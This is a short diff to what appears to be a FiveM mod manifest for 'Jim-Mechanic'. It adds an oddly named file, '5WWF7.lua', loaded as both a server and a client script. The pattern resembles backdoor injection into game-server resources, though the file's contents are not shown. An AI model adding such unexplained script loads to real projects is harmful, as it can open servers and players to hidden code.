@@ -1,3 +1,5 @@
+server_script "5WWF7.lua"
+client_script "5WWF7.lua"
 name "Jim-Mechanic"
 author "Jimathy"
 version "v2.8.5"
